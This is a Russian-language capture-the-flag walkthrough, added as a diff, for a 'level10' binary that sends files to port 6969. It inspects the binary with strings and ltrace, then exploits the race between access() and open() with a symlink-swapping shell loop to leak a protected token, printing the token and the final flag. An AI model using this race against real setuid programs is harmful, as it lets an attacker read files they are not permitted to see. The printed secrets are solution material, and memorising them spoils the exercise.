@@ -1,0 +1,107 @@
+1) Подозрительные файлы level10 и token.
+	./level10 file host
+	sends file to host if you have access to it
+
+2)strings выдает интересные строки
+	Connecting to %s:6969 ..
+	Unable to connect to host %s
+	.*( )*.
+	Unable to write banner to host %s
+	Connected!
+	Sending file ..
+	Damn. Unable to open file
+	Unable to read from file: %s
+	wrote file!
+	You don't have access to %s
+	...
+	read@@GLIBC_2.0
+	printf@@GLIBC_2.0
+	fflush@@GLIBC_2.0
+	__stack_chk_fail@@GLIBC_2.4
+	htons@@GLIBC_2.0
+	puts@@GLIBC_2.0
+	strerror@@GLIBC_2.0
+	exit@@GLIBC_2.0
+	open@@GLIBC_2.0
+	__libc_start_main@@GLIBC_2.0
+	write@@GLIBC_2.0
+	__errno_location@@GLIBC_2.0
+	access@@GLIBC_2.0
+	stdout@@GLIBC_2.0
+	socket@@GLIBC_2.0
+	inet_addr@@GLIBC_2.0
+	connect@@GLIBC_2.0
+
+3) ltrace ./level10 /tmp/test local
+	__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
+	access("/tmp/test", 4)                           = 0
+	printf("Connecting to %s:6969 .. ", "local")     = 28
+	fflush(0xb7fd1a20Connecting to local:6969 .. )                               = 0
+	socket(2, 1, 0)                                  = 3
+	inet_addr("local")                               = 0xffffffff
+	htons(6969, 1, 0, 0, 0)                          = 14619
+	connect(3, 0xbffff6ec, 16, 0, 0)                 = -1
+	printf("Unable to connect to host %s\n", "local"Unable to connect to host local
+	) = 32
+	exit(1 <unfinished ...>
+	+++ exited (status 1) +++
+
+4) Мы видим, что файл на входе читается, октрываются сокет на порту 6969, подключаются бибилиотека access и прочие.
+	socket() - создает конечную точку для связи и возвращает файл дескриптор, который относится к этой конечной точке
+	Функция inet_addr() преобразует обычный вид IP-адреса cp (из номеров и точек) в двоичный код в сетевом порядке расположения байтов.
+	Функция htons() преобразует узловой порядок расположения байтов положительного короткого целого hostshort в сетевой порядок расположения байтов.
+	connect - инициирует соединение на сокете
+	Почитав man access узнали, что access() проверяет на налчие прав у пользователя на действие с файлом.
+	Так же узнали, что access имеет уязвимость, которая позволяет использовать короткий интервал времени
+	между проверкой и открытием файла для манипулирования им.
+
+5) Значит надо открыть порт на чтение с помощью nc -lk 6969 в новой сессии терминала, и попробовать запустить
+	ltrace ./level10 /tmp/test 127.0.0.1
+	__libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>
+	access("/tmp/test", 4)                           = 0
+	printf("Connecting to %s:6969 .. ", "127.0.0.1") = 32
+	fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                               = 0
+	socket(2, 1, 0)                                  = 3
+	inet_addr("127.0.0.1")                           = 0x0100007f
+	htons(6969, 1, 0, 0, 0)                          = 14619
+	connect(3, 0xbffff6dc, 16, 0, 0)                 = 0
+	write(3, ".*( )*.\n", 8)                         = 8
+	printf("Connected!\nSending file .. "Connected!
+	)           = 27
+	fflush(0xb7fd1a20Sending file .. )                               = 0
+	open("/tmp/test", 0, 010)                        = 4
+	read(4, "125348dk\n", 4096)                      = 9
+	write(3, "125348dk\n", 9)                        = 9
+	puts("wrote file!"wrote file!
+	)                              = 12
+	+++ exited (status 12) +++
+6) Но прочитать token у нас не получается:
+	ln -s token /tmp/tkn
+	ltrace ./level10 /tmp/tkn 127.0.0.1
+	__libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>
+	access("/tmp/token", 4)                          = -1
+	printf("You don't have access to %s\n", "/tmp/token"You don't have access to /tmp/token
+	) = 36
+	+++ exited (status 36) +++
+
+7) Напишем скрипт для использования уязвимости с подменой файла между access() и open()
+	echo "missed" > /tmp/lvl10
+	vi /tmp/changer
+	while [ 1=1 ]
+		do ln -fs ~/token /tmp/token;
+		ln -fs /tmp/lvl10 /tmp/token;
+	done;
+	chmod +x /tmp/changer
+
+8) пробуем: ./level10 /tmp/token 127.0.0.1
+	не получилось :(
+	надо быстрее менять файл
+
+9) напишем скрипт и запустим в новой сессии терминала
+	while true; do ./level10 /tmp/token 127.0.0.1; done
+
+10) Получили!
+	woupa2yuojeeaaed06riuj63c
+11) su flag 10
+	getflag
+	feulo4b72j7edeahuete3no7c
